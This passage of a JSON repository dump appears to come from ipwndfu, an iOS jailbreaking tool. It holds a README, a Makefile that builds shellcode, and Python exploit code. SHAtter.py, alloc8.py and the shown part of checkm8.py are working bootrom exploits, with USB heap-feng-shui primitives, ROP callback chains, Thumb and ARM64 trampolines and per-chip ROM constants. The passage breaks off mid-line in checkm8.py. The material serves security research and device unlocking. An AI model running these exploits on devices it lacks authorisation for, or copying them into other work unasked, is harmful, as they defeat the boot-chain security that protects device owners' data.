GNU GPL, see\n<http://www.gnu.org/licenses/>.\n\n  The GNU General Public License does not permit incorporating your program\ninto proprietary programs.  If your program is a subroutine library, you\nmay consider it more useful to permit linking proprietary applications with\nthe library.  If this is what you want to do, use the GNU Lesser General\nPublic License instead of this License.  But first, please read\n<http://www.gnu.org/philosophy/why-not-lgpl.html>.\n"
        },
        {
          "name": "Makefile",
          "type": "blob",
          "size": 2.59375,
          "content": "all: armv6 armv7 arm64\n\narmv6:\n\tarm-none-eabi-as -march=armv6 -mthumb --fatal-warnings -o bin/steaks4uce-shellcode.o src/steaks4uce-shellcode.S\n\tarm-none-eabi-objcopy -O binary bin/steaks4uce-shellcode.o bin/steaks4uce-shellcode.bin\n\trm bin/steaks4uce-shellcode.o\n\narmv7:\n\tarm-none-eabi-as -mthumb --fatal-warnings -o bin/limera1n-shellcode.o src/limera1n-shellcode.S\n\tarm-none-eabi-objcopy -O binary bin/limera1n-shellcode.o bin/limera1n-shellcode.bin\n\trm bin/limera1n-shellcode.o\n\n\tarm-none-eabi-as -mthumb --fatal-warnings -o bin/SHAtter-shellcode.o src/SHAtter-shellcode.S\n\tarm-none-eabi-objcopy -O binary bin/SHAtter-shellcode.o bin/SHAtter-shellcode.bin\n\trm bin/SHAtter-shellcode.o\n\n\tarm-none-eabi-as -mthumb --fatal-warnings -o bin/24Kpwn-shellcode.o src/24Kpwn-shellcode.S\n\tarm-none-eabi-objcopy -O binary bin/24Kpwn-shellcode.o bin/24Kpwn-shellcode.bin\n\trm bin/24Kpwn-shellcode.o\n\n\tarm-none-eabi-as -mthumb --fatal-warnings -o bin/alloc8-shellcode.o src/alloc8-shellcode.S\n\tarm-none-eabi-objcopy -O binary bin/alloc8-shellcode.o bin/alloc8-shellcode.bin\n\trm bin/alloc8-shellcode.o\n\n\tarm-none-eabi-as -mthumb --fatal-warnings -o bin/ibss-flash-nor-shellcode.o src/ibss-flash-nor-shellcode.S\n\tarm-none-eabi-objcopy -O binary bin/ibss-flash-nor-shellcode.o bin/ibss-flash-nor-shellcode.bin\n\trm bin/ibss-flash-nor-shellcode.o\n\n\tarm-none-eabi-as -mthumb --fatal-warnings -o bin/usb_0xA1_2_armv7.o src/usb_0xA1_2_armv7.S\n\tarm-none-eabi-objcopy -O binary bin/usb_0xA1_2_armv7.o bin/usb_0xA1_2_armv7.bin\n\trm bin/usb_0xA1_2_armv7.o\n\n\tarm-none-eabi-as -mthumb --fatal-warnings -o bin/checkm8_armv7.o src/checkm8_armv7.S\n\tarm-none-eabi-objcopy -O binary bin/checkm8_armv7.o bin/checkm8_armv7.bin\n\trm bin/checkm8_armv7.o\n\narm64:\n\txcrun -sdk iphoneos clang src/usb_0xA1_2_arm64.S -target arm64-apple-darwin -Wall -o bin/usb_0xA1_2_arm64.o\n\tgobjcopy -O binary -j .text bin/usb_0xA1_2_arm64.o bin/usb_0xA1_2_arm64.bin\n\trm bin/usb_0xA1_2_arm64.o\n\n\txcrun -sdk iphoneos clang src/checkm8_arm64.S -target arm64-apple-darwin -Wall -o bin/checkm8_arm64.o\n\tgobjcopy -O binary -j .text bin/checkm8_arm64.o bin/checkm8_arm64.bin\n\trm bin/checkm8_arm64.o\n\n\txcrun -sdk iphoneos clang src/t8010_t8011_disable_wxn_arm64.S -target arm64-apple-darwin -Wall -o bin/t8010_t8011_disable_wxn_arm64.o\n\tgobjcopy -O binary -j .text bin/t8010_t8011_disable_wxn_arm64.o bin/t8010_t8011_disable_wxn_arm64.bin\n\trm bin/t8010_t8011_disable_wxn_arm64.o\n\n\txcrun -sdk iphoneos clang src/t8015_shellcode_arm64.S -target arm64-apple-darwin -Wall -o bin/t8015_shellcode_arm64.o\n\tgobjcopy -O binary -j .text bin/t8015_shellcode_arm64.o bin/t8015_shellcode_arm64.bin\n\trm bin/t8015_shellcode_arm64.o\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 4.333984375,
          "content": "![](repo/ipwndfu.png)\n# Open-source jailbreaking tool for many iOS devices\n\n\n**Read [disclaimer](#disclaimer) before using this software.*\n\n\n## checkm8\n\n* permanent unpatchable bootrom exploit for hundreds of millions of iOS devices\n\n* meant for researchers, this is not a jailbreak with Cydia yet\n\n* allows dumping SecureROM, decrypting keybags for iOS firmware, and demoting device for JTAG\n\n* current SoC support: s5l8947x, s5l8950x, s5l8955x, s5l8960x, t8002, t8004, t8010, t8011, t8015\n\n* future SoC support: s5l8940x, s5l8942x, s5l8945x, s5l8747x, t7000, t7001, s7002, s8000, s8001, s8003, t8012\n\n* full jailbreak with Cydia on latest iOS version is possible, but requires additional work\n\n\n## Quick start guide for checkm8\n\n1. Use a cable to connect device to your Mac. Hold buttons as needed to enter DFU Mode.\n\n2. First run ```./ipwndfu -p``` to exploit the device. Repeat the process if it fails, it is not reliable.\n\n3. Run ```./ipwndfu --dump-rom``` to get a dump of SecureROM.\n\n4. Run ```./ipwndfu --decrypt-gid KEYBAG``` to decrypt a keybag.\n\n5. Run ```./ipwndfu --demote``` to demote device and enable JTAG.\n\n\n## Features\n\n* Jailbreak and downgrade iPhone 3GS (new bootrom) with alloc8 untethered bootrom exploit. :-)\n\n* Pwned DFU Mode with steaks4uce exploit for S5L8720 devices.\n\n* Pwned DFU Mode with limera1n exploit for S5L8920/S5L8922 devices.\n\n* Pwned DFU Mode with SHAtter exploit for S5L8930 devices.\n\n* Dump SecureROM on S5L8920/S5L8922/S5L8930 devices.\n\n* Dump NOR on S5L8920 devices.\n\n* Flash NOR on S5L8920 devices.\n\n* Encrypt or decrypt hex data on a connected device in pwned DFU Mode using its GID or UID key.\n\n\n## Dependencies\n\nThis tool should be compatible with Mac and Linux. It won't work in a virtual machine.\n\n* libusb, `If you are using Linux: install libusb using your package manager.`\n* [iPhone 3GS iOS 4.3.5 iBSS](#ibss)\n\n\n## Tutorial\n\nThis tool can be used to downgrade or jailbreak iPhone 3GS (new bootrom) without SHSH blobs, as documented in [JAILBREAK-GUIDE](https://github.com/axi0mX/ipwndfu/blob/master/JAILBREAK-GUIDE.md).\n\n\n## Exploit write-up\n\nWrite-up for alloc8 exploit can be found here:\n\nhttps://github.com/axi0mX/alloc8\n\n\n## iBSS\n\nDownload iPhone 3GS iOS 4.3.5 IPSW from Apple:\n\nhttp://appldnld.apple.com/iPhone4/041-1965.20110721.gxUB5/iPhone2,1_4.3.5_8L1_Restore.ipsw\n\nIn Terminal, extract iBSS using the following command, then move the file to ipwndfu folder:\n\n```\nunzip -p iPhone2,1_4.3.5_8L1_Restore.ipsw Firmware/dfu/iBSS.n88ap.RELEASE.dfu > n88ap-iBSS-4.3.5.img3\n```\n\n\n## Coming soon!\n\n* Reorganize and refactor code.\n\n* Easier setup: download iBSS automatically using partial zip.\n\n* Dump SecureROM on S5L8720 devices.\n\n* Install custom boot logos on devices jailbroken with 24Kpwn and alloc8.\n\n* Enable verbose boot on devices jailbroken with 24Kpwn and alloc8.\n\n## Disclaimer\n\n**This is BETA software.**\n\nBackup your data.\n\nThis tool is currently in beta and could potentially brick your device. It will attempt to save a copy of data in NOR to nor-backups folder before flashing new data to NOR, and it will attempt to not overwrite critical data in NOR which your device requires to function. If something goes wrong, hopefully you will be able to restore to latest IPSW in iTunes and bring your device back to life, or use nor-backups to restore NOR to the original state, but I cannot provide any guarantees.\n\n**There is NO warranty provided.**\n\nTHERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW. THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU. SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR OR CORRECTION.\n\n## Toolchain\n\nYou will not need to use `make` or compile anything to use ipwndfu. However, if you wish to make changes to assembly code in `src/*`, you will need to use an ARM toolchain and assemble the source files by running `make`.\n\nIf you are using macOS with Homebrew, you can use binutils and gcc-arm-embedded. You can install them with these commands:\n\n```\nbrew install binutils\nbrew cask install https://raw.githubusercontent.com/Homebrew/homebrew-cask/b88346667547cc85f8f2cacb3dfe7b754c8afc8a/Casks/gcc-arm-embedded.rb\n```\n\n## Credit\n\ngeohot for limera1n exploit\n\nposixninja and pod2g for SHAtter exploit\n\nchronic, CPICH, ius, MuscleNerd, Planetbeing, pod2g, posixninja, et al. for 24Kpwn exploit\n\npod2g for steaks4uce exploit\n\nwalac for pyusb\n"
        },
        {
          "name": "SHAtter.py",
          "type": "blob",
          "size": 2.3388671875,
          "content": "# Credit: This file is based on SHAtter exploit (segment overflow) by posixninja and pod2g.\n\nimport struct, sys, time\nimport dfu\n\ndef generate_payload():\n    shellcode_address = 0x8402F198 + 1\n    data = struct.pack('<40sI', '\\xF0' * 40, shellcode_address)\n    tags = data + struct.pack('<4s2I4s2I', 'SHSH'[::-1], 12, 0, 'CERT'[::-1], 12, 0)\n    header = struct.pack('<4s3I4s', 'Img3'[::-1], 20 + len(tags), len(tags), len(data), 'ibss'[::-1])\n    with open('bin/SHAtter-shellcode.bin', 'rb') as f:\n        shellcode = f.read()\n    assert len(shellcode) <= 1024\n    return header + tags + shellcode\n\ndef exploit():\n    print '*** based on SHAtter exploit (segment overflow) by posixninja and pod2g ***'\n\n    device = dfu.acquire_device()\n    print 'Found:', device.serial_number\n\n    if 'PWND:[' in device.serial_number:\n        print 'Device is already in pwned DFU Mode. Not executing exploit.'\n        return\n\n    if 'CPID:8930' not in device.serial_number:\n        print 'ERROR: Not a compatible device. This exploit is for S5L8930 devices only. Exiting.'\n        sys.exit(1)\n\n    if 'SRTG:[iBoot-574.4]' not in device.serial_number:\n        print 'ERROR: CPID is compatible, but serial number string does not match.'\n        print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'\n        sys.exit(1)\n\n    dfu.reset_counters(device)\n    dfu.get_data(device, 0x40)\n    dfu.usb_reset(device)\n    dfu.release_device(device)\n\n    device = dfu.acquire_device()\n    dfu.request_image_validation(device)\n    dfu.release_device(device)\n\n    device = dfu.acquire_device()\n    dfu.get_data(device, 0x2C000)\n    dfu.release_device(device)\n\n    time.sleep(0.5)\n\n    device = dfu.acquire_device()\n    dfu.reset_counters(device)\n    dfu.get_data(device, 0x140)\n    dfu.usb_reset(device)\n    dfu.release_device(device)\n\n    device = dfu.acquire_device()\n    dfu.request_image_validation(device)\n    dfu.release_device(device)\n\n    device = dfu.acquire_device()\n    dfu.send_data(device, generate_payload())\n    dfu.get_data(device, 0x2C000)\n    dfu.release_device(device)\n\n    time.sleep(0.5)\n\n    device = dfu.acquire_device()\n    failed = 'PWND:[SHAtter]' not in device.serial_number\n    dfu.release_device(device)\n\n    if failed:\n        print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'\n        sys.exit(1)\n\n    print 'Device is now in pwned DFU Mode.'\n"
        },
        {
          "name": "aes-keys",
          "type": "tree",
          "content": null
        },
        {
          "name": "alloc8.py",
          "type": "blob",
          "size": 4.142578125,
          "content": "import copy, struct, sys\n\nalloc8_constants_359_3 = [\n    0x84034000, #  1 - MAIN_STACK_ADDRESS\n         0x544, #  2 - clean_invalidate_data_cache\n    0x84024020, #  3 - gNorImg3List\n        0x1ccd, #  4 - free\n        0x3ca1, #  5 - exit_critical_section\n        0x451d, #  6 - home_button_pressed\n        0x450d, #  7 - power_button_pressed\n        0x44e1, #  8 - cable_connected\n    0x696c6c62, #  9 - ILLB_MAGIC\n        0x1f6f, # 10 - get_nor_image\n    0x84000000, # 11 - LOAD_ADDRESS\n       0x24000, # 12 - MAX_SIZE\n        0x3969, # 13 - jump_to\n        0x38a1, # 14 - usb_create_serial_number_string\n        0x8e7d, # 15 - strlcat\n        0x349d, # 16 - usb_wait_for_image\n    0x84024228, # 17 - gLeakingDFUBuffer\n    0x65786563, # 18 - EXEC_MAGIC\n        0x1f79, # 19 - memz_create\n        0x1fa1, # 20 - memz_destroy\n    0x696d6733, # 21 - IMG3_STRUCT_MAGIC\n    0x4d656d7a, # 22 - MEMZ_STRUCT_MAGIC\n        0x1fe5, # 23 - image3_create_struct\n        0x2655, # 24 - image3_load_continue\n        0x277b, # 25 - image3_load_fail\n]\n\nalloc8_constants_359_3_2 = [\n    0x84034000, #  1 - MAIN_STACK_ADDRESS\n         0x544, #  2 - clean_invalidate_data_cache\n    0x84024020, #  3 - gNorImg3List\n        0x1ccd, #  4 - free\n        0x3ca9, #  5 - exit_critical_section\n        0x4525, #  6 - home_button_pressed\n        0x4515, #  7 - power_button_pressed\n        0x44e9, #  8 - cable_connected\n    0x696c6c62, #  9 - ILLB_MAGIC\n        0x1f77, # 10 - get_nor_image\n    0x84000000, # 11 - LOAD_ADDRESS\n       0x24000, # 12 - MAX_SIZE\n        0x3971, # 13 - jump_to\n        0x38a9, # 14 - usb_create_serial_number_string\n        0x8e85, # 15 - strlcat\n        0x34a5, # 16 - usb_wait_for_image\n    0x84024228, # 17 - gLeakingDFUBuffer\n    0x65786563, # 18 - EXEC_MAGIC\n        0x1f81, # 19 - memz_create\n        0x1fa9, # 20 - memz_destroy\n    0x696d6733, # 21 - IMG3_STRUCT_MAGIC\n    0x4d656d7a, # 22 - MEMZ_STRUCT_MAGIC\n        0x1fed, # 23 - image3_create_struct\n        0x265d, # 24 - image3_load_continue\n        0x2783, # 25 - image3_load_fail\n]\n\ndef empty_img3(size):\n\tassert size >= 20\n\treturn struct.pack('<4s3I4s', 'Img3'[::-1], size, 0, 0, 'zero'[::-1]) + '\\x00' * (size - 20)\n\ndef exploit(nor, version):\n\tif version == '359.3':\n\t    constants = alloc8_constants_359_3\n\t    exceptions = [0x5620, 0x5630]\n\telif version == '359.3.2':\n\t    constants = alloc8_constants_359_3_2\n\t    exceptions = [0x5628, 0x5638]\n\telse:\n\t    print 'ERROR: SecureROM version %s is not supported by alloc8.' % version\n\t    sys.exit(1)\n\n\tfor c in nor.parts[1]:\n\t\tassert c == '\\x00'\n\tassert len(nor.images) < 32\n\n\tMAX_SHELLCODE_LENGTH = 460\n\twith open('bin/alloc8-shellcode.bin', 'rb') as f:\n\t\tshellcode = f.read()\n\tassert len(shellcode) <= MAX_SHELLCODE_LENGTH\n\n\t# Shellcode has placeholder values for constants; check they match and replace with constants from config.\n\tplaceholders_offset = len(shellcode) - 4 * len(constants)\n\tfor i in range(len(constants)):\n\t    offset = placeholders_offset + 4 * i\n\t    (value,) = struct.unpack('<I', shellcode[offset:offset + 4])\n\t    assert value == 0xBAD00001 + i\n\n\tnew_nor = copy.deepcopy(nor)\n\tnew_nor.parts[1] = shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants) + '\\x00' * (MAX_SHELLCODE_LENGTH - len(shellcode))\n\n\twhile len(new_nor.images) < 713:\n\t   new_nor.images.append(empty_img3(new_nor.block_size))\n\n\t# Image no. 714 must end at the end of the 4096-byte block.\n\tNOR_READ_SIZE = 4096\n\toffset = 0\n\tfor image in new_nor.images:\n\t\toffset += len(image)\n\tsize = NOR_READ_SIZE - offset % NOR_READ_SIZE\n\tnew_nor.images.append(empty_img3(size))\n\n\t# This image is copied to address 0x8. SHELLCODE_ADDRESS overrides the data abort exception handler.\n\tSHELLCODE_ADDRESS = 0x84026214 + 1\n\tnew_nor.images.append(empty_img3(52)[:40] + struct.pack('<4I', SHELLCODE_ADDRESS, 0, *exceptions))\n\n\treturn new_nor\n\ndef remove_exploit(nor):\n    assert len(nor.images) >= 700\n\n    new_nor = copy.deepcopy(nor)\n\n    new_images = []\n    for image in new_nor.images:\n        assert len(image) >= 20\n        if image[16:20] != 'zero'[::-1]:\n            new_images.append(image)\n    assert len(new_images) < 32\n\n    new_nor.images = new_images\n    new_nor.parts[1] = '\\x00' * 460\n\n    return new_nor\n"
        },
        {
          "name": "bin",
          "type": "tree",
          "content": null
        },
        {
          "name": "checkm8.py",
          "type": "blob",
          "size": 23.009765625,
          "content": "import array, ctypes, struct, sys, time\nimport usb\nimport dfu\n\n# Must be global so garbage collector never frees it\nrequest = None\ntransfer_ptr = None\nnever_free_device = None\n\ndef libusb1_create_ctrl_transfer(device, request, timeout):\n  ptr = usb.backend.libusb1._lib.libusb_alloc_transfer(0)\n  assert ptr is not None\n\n  transfer = ptr.contents\n  transfer.dev_handle = device._ctx.handle.handle\n  transfer.endpoint = 0 # EP0\n  transfer.type = 0 # LIBUSB_TRANSFER_TYPE_CONTROL\n  transfer.timeout = timeout\n  transfer.buffer = request.buffer_info()[0] # C-pointer to request buffer\n  transfer.length = len(request)\n  transfer.user_data = None\n  transfer.callback = usb.backend.libusb1._libusb_transfer_cb_fn_p(0) # NULL\n  transfer.flags = 1 << 1 # LIBUSB_TRANSFER_FREE_BUFFER\n\n  return ptr\n\ndef libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data, timeout):\n  if usb.backend.libusb1._lib is not device._ctx.backend.lib:\n    print 'ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting.'\n    sys.exit(1)\n\n  global request, transfer_ptr, never_free_device\n  request_timeout = int(timeout) if timeout >= 1 else 0\n  start = time.time()\n  never_free_device = device\n  request = array.array('B', struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data)) + data)\n  transfer_ptr = libusb1_create_ctrl_transfer(device, request, request_timeout)\n  assert usb.backend.libusb1._lib.libusb_submit_transfer(transfer_ptr) == 0\n\n  while time.time() - start < timeout / 1000.0:\n    pass\n\n  # Prototype of libusb_cancel_transfer is missing from pyusb\n  usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [ctypes.POINTER(usb.backend.libusb1._libusb_transfer)]\n  assert usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr) == 0\n\ndef libusb1_no_error_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout):\n  try:\n    device.ctrl_transfer(bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout)\n  except usb.core.USBError:\n    pass\n\ndef usb_rop_callbacks(address, func_gadget, callbacks):\n  data = ''\n  for i in range(0, len(callbacks), 5):\n    block1 = ''\n    block2 = ''\n    for j in range(5):\n      address += 0x10\n      if j == 4:\n        address += 0x50\n      if i + j < len(callbacks) - 1:\n        block1 += struct.pack('<2Q', func_gadget, address)\n        block2 += struct.pack('<2Q', callbacks[i+j][1], callbacks[i+j][0])\n      elif i + j == len(callbacks) - 1:\n        block1 += struct.pack('<2Q', func_gadget, 0)\n        block2 += struct.pack('<2Q', callbacks[i+j][1], callbacks[i+j][0])\n      else:\n        block1 += struct.pack('<2Q', 0, 0)\n    data += block1 + block2\n  return data\n\n# TODO: assert we are within limits\ndef asm_arm64_branch(src, dest):\n  if src > dest:\n    value = 0x18000000 - (src - dest) / 4\n  else:\n    value = 0x14000000 + (dest - src) / 4\n  return struct.pack('<I', value)\n\n# TODO: check if start offset % 4 would break it\n# LDR X7, [PC, #OFFSET]; BR X7\ndef asm_arm64_x7_trampoline(dest):\n  return '47000058E0001FD6'.decode('hex') + struct.pack('<Q', dest)\n\n# THUMB +0 [0xF000F8DF, ADDR]  LDR.W   PC, [PC]\n# THUMB +2 [0xF002F8DF, ADDR]  LDR.W   PC, [PC, #2]\ndef asm_thumb_trampoline(src, dest):\n  assert src % 2 == 1 and dest % 2 == 1\n  if src % 4 == 1:\n    return struct.pack('<2I', 0xF000F8DF, dest)\n  else:\n    return struct.pack('<2I', 0xF002F8DF, dest)\n\ndef prepare_shellcode(name, constants=[]):\n  if name.endswith('_armv7'):\n    fmt = '<%sI'\n    size = 4\n  elif name.endswith('_arm64'):\n    fmt = '<%sQ'\n    size = 8\n  else:\n    print 'ERROR: Shellcode name \"%s\" does not end with known architecture. Exiting.' % name\n    sys.exit(1)\n\n  with open('bin/%s.bin' % name, 'rb') as f:\n    shellcode = f.read()\n\n  # Shellcode has placeholder values for constants; check they match and replace with constants from config\n  placeholders_offset = len(shellcode) - size * len(constants)\n  for i in range(len(constants)):\n      offset = placeholders_offset + size * i\n      (value,) = struct.unpack(fmt % '1', shellcode[offset:offset + size])\n      assert value == 0xBAD00001 + i\n\n  return shellcode[:placeholders_offset] + struct.pack(fmt % len(constants), *constants)\n\ndef stall(device):   libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 'A' * 0xC0, 0.00001)\ndef leak(device):    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)\ndef no_leak(device): libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)\n\ndef usb_req_stall(device):   libusb1_no_error_ctrl_transfer(device,  0x2, 3,   0x0,  0x80,  0x0, 10)\ndef usb_req_leak(device):    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x40,  1)\ndef usb_req_no_leak(device): libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x41,  1)\n\nclass DeviceConfig:\n  def __init__(self, version, cpid, large_leak, overwrite, hole, leak):\n    assert len(overwrite) <= 0x800\n    self.version    = version\n    self.cpid       = cpid\n    self.large_leak = large_leak\n    self.overwrite  = overwrite\n    self.hole       = hole\n    self.leak       = leak\n\nPAYLOAD_OFFSET_ARMV7 = 384\nPAYLOAD_SIZE_ARMV7   = 320\nPAYLOAD_OFFSET_ARM64 = 384\nPAYLOAD_SIZE_ARM64   = 576\n\ndef payload(cpid):\n  if cpid == 0x8947:\n    constants_usb_s5l8947x = [\n                0x34000000, # 1 - LOAD_ADDRESS\n                0x65786563, # 2 - EXEC_MAGIC\n                0x646F6E65, # 3 - DONE_MAGIC\n                0x6D656D63, # 4 - MEMC_MAGIC\n                0x6D656D73, # 5 - MEMS_MAGIC\n                  0x79EC+1, # 6 - USB_CORE_DO_IO\n    ]\n    constants_checkm8_s5l8947x = [\n                0x3402D87C, # 1 - gUSBDescriptors\n                0x3402DDF8, # 2 - gUSBSerialNumber\n                  0x72A8+1, # 3 - usb_create_string_descriptor\n                0x3402C2DA, # 4 - gUSBSRNMStringDescriptor\n                0x34039800, # 5 - PAYLOAD_DEST\n      PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET\n        PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE\n                0x3402D92C, # 8 - PAYLOAD_PTR\n    ]\n    s5l8947x_handler = asm_thumb_trampoline(0x34039800+1, 0x7BC8+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_s5l8947x)[8:]\n    s5l8947x_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_s5l8947x)\n    assert len(s5l8947x_shellcode) <= PAYLOAD_OFFSET_ARMV7\n    assert len(s5l8947x_handler) <= PAYLOAD_SIZE_ARMV7\n    return s5l8947x_shellcode + '\\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8947x_shellcode)) + s5l8947x_handler\n  if cpid == 0x8950:\n    constants_usb_s5l8950x = [\n                0x10000000, # 1 - LOAD_ADDRESS\n                0x65786563, # 2 - EXEC_MAGIC\n                0x646F6E65, # 3 - DONE_MAGIC\n                0x6D656D63, # 4 - MEMC_MAGIC\n                0x6D656D73, # 5 - MEMS_MAGIC\n                  0x7620+1, # 6 - USB_CORE_DO_IO\n    ]\n    constants_checkm8_s5l8950x = [\n                0x10061988, # 1 - gUSBDescriptors\n                0x10061F80, # 2 - gUSBSerialNumber\n                  0x7C54+1, # 3 - usb_create_string_descriptor\n                0x100600D8, # 4 - gUSBSRNMStringDescriptor\n                0x10079800, # 5 - PAYLOAD_DEST\n      PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET\n        PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE\n                0x10061A24, # 8 - PAYLOAD_PTR\n    ]\n    s5l8950x_handler   = asm_thumb_trampoline(0x10079800+1, 0x8160+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_s5l8950x)[8:]\n    s5l8950x_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_s5l8950x)\n    assert len(s5l8950x_shellcode) <= PAYLOAD_OFFSET_ARMV7\n    assert len(s5l8950x_handler) <= PAYLOAD_SIZE_ARMV7\n    return s5l8950x_shellcode + '\\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8950x_shellcode)) + s5l8950x_handler\n  if cpid == 0x8955:\n    constants_usb_s5l8955x = [\n                0x10000000, # 1 - LOAD_ADDRESS\n                0x65786563, # 2 - EXEC_MAGIC\n                0x646F6E65, # 3 - DONE_MAGIC\n                0x6D656D63, # 4 - MEMC_MAGIC\n                0x6D656D73, # 5 - MEMS_MAGIC\n                  0x7660+1, # 6 - USB_CORE_DO_IO\n    ]\n    constants_checkm8_s5l8955x = [\n                0x10061988, # 1 - gUSBDescriptors\n                0x10061F80, # 2 - gUSBSerialNumber\n                  0x7C94+1, # 3 - usb_create_string_descriptor\n                0x100600D8, # 4 - gUSBSRNMStringDescriptor\n                0x10079800, # 5 - PAYLOAD_DEST\n      PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET\n        PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE\n                0x10061A24, # 8 - PAYLOAD_PTR\n    ]\n    s5l8955x_handler   = asm_thumb_trampoline(0x10079800+1, 0x81A0+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_s5l8955x)[8:]\n    s5l8955x_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_s5l8955x)\n    assert len(s5l8955x_shellcode) <= PAYLOAD_OFFSET_ARMV7\n    assert len(s5l8955x_handler) <= PAYLOAD_SIZE_ARMV7\n    return s5l8955x_shellcode + '\\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8955x_shellcode)) + s5l8955x_handler\n  if cpid == 0x8960:\n    constants_usb_s5l8960x = [\n               0x180380000, # 1 - LOAD_ADDRESS\n        0x6578656365786563, # 2 - EXEC_MAGIC\n        0x646F6E65646F6E65, # 3 - DONE_MAGIC\n        0x6D656D636D656D63, # 4 - MEMC_MAGIC\n        0x6D656D736D656D73, # 5 - MEMS_MAGIC\n               0x10000CC78, # 6 - USB_CORE_DO_IO\n    ]\n    constants_checkm8_s5l8960x = [\n               0x180086B58, # 1 - gUSBDescriptors\n               0x180086CDC, # 2 - gUSBSerialNumber\n               0x10000BFEC, # 3 - usb_create_string_descriptor\n               0x180080562, # 4 - gUSBSRNMStringDescriptor\n               0x18037FC00, # 5 - PAYLOAD_DEST\n      PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET\n        PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE\n               0x180086C70, # 8 - PAYLOAD_PTR\n    ]\n    s5l8960x_handler   = asm_arm64_x7_trampoline(0x10000CFB4) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_s5l8960x)[4:]\n    s5l8960x_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_s5l8960x)\n    assert len(s5l8960x_shellcode) <= PAYLOAD_OFFSET_ARM64\n    assert len(s5l8960x_handler) <= PAYLOAD_SIZE_ARM64\n    return s5l8960x_shellcode + '\\0' * (PAYLOAD_OFFSET_ARM64 - len(s5l8960x_shellcode)) + s5l8960x_handler\n  if cpid == 0x8002:\n    constants_usb_t8002 = [\n                0x48818000, # 1 - LOAD_ADDRESS\n                0x65786563, # 2 - EXEC_MAGIC\n                0x646F6E65, # 3 - DONE_MAGIC\n                0x6D656D63, # 4 - MEMC_MAGIC\n                0x6D656D73, # 5 - MEMS_MAGIC\n                  0x9410+1, # 6 - USB_CORE_DO_IO\n    ]\n    constants_checkm8_t8002 = [\n                0x4880629C, # 1 - gUSBDescriptors\n                0x48802AB8, # 2 - gUSBSerialNumber\n                  0x8CA4+1, # 3 - usb_create_string_descriptor\n                0x4880037A, # 4 - gUSBSRNMStringDescriptor\n                0x48806E00, # 5 - PAYLOAD_DEST\n      PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET\n        PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE\n                0x48806344, # 8 - PAYLOAD_PTR\n    ]\n    t8002_handler = asm_thumb_trampoline(0x48806E00+1, 0x95F0+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_t8002)[8:]\n    t8002_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_t8002)\n    assert len(t8002_shellcode) <= PAYLOAD_OFFSET_ARMV7\n    assert len(t8002_handler) <= PAYLOAD_SIZE_ARMV7\n    return t8002_shellcode + '\\0' * (PAYLOAD_OFFSET_ARMV7 - len(t8002_shellcode)) + t8002_handler\n  if cpid == 0x8004:\n    constants_usb_t8004 = [\n                0x48818000, # 1 - LOAD_ADDRESS\n                0x65786563, # 2 - EXEC_MAGIC\n                0x646F6E65, # 3 - DONE_MAGIC\n                0x6D656D63, # 4 - MEMC_MAGIC\n                0x6D656D73, # 5 - MEMS_MAGIC\n                  0x85A0+1, # 6 - USB_CORE_DO_IO\n    ]\n    constants_checkm8_t8004 = [\n                0x488062DC, # 1 - gUSBDescriptors\n                0x48802AE8, # 2 - gUSBSerialNumber\n                  0x7E34+1, # 3 - usb_create_string_descriptor\n                0x488003CA, # 4 - gUSBSRNMStringDescriptor\n                0x48806E00, # 5 - PAYLOAD_DEST\n      PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET\n        PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE\n                0x48806384, # 8 - PAYLOAD_PTR\n    ]\n    t8004_handler = asm_thumb_trampoline(0x48806E00+1, 0x877C+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_t8004)[8:]    \n    t8004_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_t8004)\n    assert 